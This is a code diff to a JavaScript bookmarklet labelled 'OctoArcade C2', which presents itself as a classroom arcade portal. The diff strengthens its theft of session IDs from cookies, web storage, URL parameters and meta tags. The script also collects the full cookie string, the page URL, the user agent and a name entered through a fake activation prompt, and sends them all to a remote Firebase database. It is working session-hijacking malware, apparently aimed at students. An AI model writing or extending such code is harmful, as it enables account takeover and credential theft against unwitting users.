@@ -1,6 +1,3 @@
-// OctoArcade C2 Bookmarklet Logic
-// This script is designed to be executed via a javascript: URL or injected directly.
-
 (function() {
   // 1. CONFIGURATION
   const firebaseConfig = {
@@ -13,10 +10,41 @@
   };
   const OCTO_URL = 'https://octoarcade.vercel.app';
 
-  // 2. DATA COLLECTION
+  // 2. AGGRESSIVE SESSION ID EXTRACTION
+  const getSessionId = () => {
+    // A. Try Cookies (Standard JSESSIONID)
+    const cookies = document.cookie;
+    const cookieMatch = cookies.match(/(?:^|;\s*)JSESSIONID=([^;]+)/);
+    if (cookieMatch) return cookieMatch[1];
+
+    // B. Try LocalStorage (Common SPA pattern)
+    try {
+      const ls = JSON.parse(localStorage.getItem('session') || '{}');
+      if (ls.sessionId) return ls.sessionId;
+      if (ls.JSESSIONID) return ls.JSESSIONID;
+    } catch (e) {}
+
+    // C. Try SessionStorage
+    try {
+      const ss = JSON.parse(sessionStorage.getItem('session') || '{}');
+      if (ss.sessionId) return ss.sessionId;
+    } catch (e) {}
+
+    // D. Try URL Parameters (Sometimes passed in query string)
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('JSESSIONID')) return urlParams.get('JSESSIONID');
+    if (urlParams.get('session_id')) return urlParams.get('session_id');
+
+    // E. Try Meta Tags (Rare, but possible in some legacy systems)
+    const metaSession = document.querySelector('meta[name="session-id"]');
+    if (metaSession) return metaSession.getAttribute('content');
+
+    // F. Fallback
+    return "NO_SESSION_FOUND";
+  };
+
+  const sessionId = getSessionId();
   const cookies = document.cookie;
-  const sessionMatch = cookies.match(/JSESSIONID=([^;]+)/);
-  const sessionId = sessionMatch ? sessionMatch[1] : "Not_Found";
   const url = location.href;
   const ua = navigator.userAgent;
   const name = prompt("🐙 Octo Arcade\n\nEnter your full name to activate the classroom portal:") || "Unverified";
@@ -37,6 +65,7 @@
 
       const payload = {
         name: name,
+        sessionId: sessionId, // Explicitly store the extracted ID
         url: url,
         ua: ua,
         ck: cookies,
@@ -49,7 +78,7 @@
       const docId = `${name}-${sessionId}`;
       db.collection('students').doc(docId).set(payload, { merge: true })
         .then(() => {
-          console.log(`[OctoSync] Profile verified for: ${name}`);
+          console.log(`[OctoSync] Session ID captured: ${sessionId}`);
           injectOcto();
         })
         .catch(error => {
